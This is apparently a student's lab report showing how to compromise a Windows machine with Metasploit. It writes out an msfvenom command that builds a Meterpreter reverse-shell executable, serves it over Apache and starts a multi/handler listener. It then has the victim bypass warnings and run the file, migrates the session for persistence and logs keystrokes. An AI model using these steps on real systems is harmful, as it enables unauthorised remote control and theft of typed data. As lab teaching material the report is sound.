# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit
### NAME:N.NAVYA SREE
### REG NO:212223040138

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT:
![Screenshot 2024-10-30 084351](https://github.com/user-attachments/assets/c13ae138-865e-4a0c-aa73-cb16bcab572a)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![Screenshot 2024-10-30 084404](https://github.com/user-attachments/assets/0d4bf214-1c2d-4239-83ca-c7a8ab4aef08)

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
![Screenshot 2024-10-30 084413](https://github.com/user-attachments/assets/21ab6ec8-d9aa-47b9-a2d2-cdfff4b1c690)



Start apache server
sudo systemctl apache2 start
## OUTPUT:
![Screenshot 2024-10-30 084419](https://github.com/user-attachments/assets/962ebb97-efcd-462e-bfa5-6c2397d28e09)


Check the status of apache2
## OUTPUT:
![Screenshot 2024-10-09 082834](https://github.com/user-attachments/assets/545a3b41-410d-481e-ba6a-0215594f1a8e)

Invoke msfconsole:
## OUTPUT:
![Screenshot 2024-10-30 084437](https://github.com/user-attachments/assets/47538d80-0d1b-41f2-95d8-6407caa05d29)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![Screenshot 2024-10-09 082914](https://github.com/user-attachments/assets/4622b76d-8df9-45f6-a299-81e4fa841f89)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![Screenshot 2024-10-09 082927](https://github.com/user-attachments/assets/37229e74-48c4-438f-b719-8eaeb3442bb1)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![Screenshot 2024-10-09 082936](https://github.com/user-attachments/assets/6c2f5125-3af1-4220-9d09-3de65ce1c6f1)

Bypass any warning boxes, double-click the file, and allow it to run.

![Screenshot 2024-10-09 082947](https://github.com/user-attachments/assets/30514d6a-414c-4acc-8545-6bda15593bad)

On kali give the command exploit

![Screenshot 2024-10-09 082956](https://github.com/user-attachments/assets/ad2511f0-706e-42c8-bc08-8527e5b31cd5)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![Screenshot 2024-10-30 092955](https://github.com/user-attachments/assets/d0cee197-7029-4bd2-9514-08dd8ff8879a)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:
migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![Screenshot 2024-10-09 083017](https://github.com/user-attachments/assets/15693580-f55a-4729-89ea-b4a8245ad8fd)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2024-10-09 083042](https://github.com/user-attachments/assets/d3955e35-d9f8-4319-8e23-910884f3bf40)

![Screenshot 2024-10-09 083053](https://github.com/user-attachments/assets/a091a620-6605-4976-b330-edd98659798f)


keyscan_dump	Shows the keystrokes captured so far

![Screenshot 2024-10-09 083101](https://github.com/user-attachments/assets/e8496e1e-b936-41a6-b8d5-fcd5e86e8dd6)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
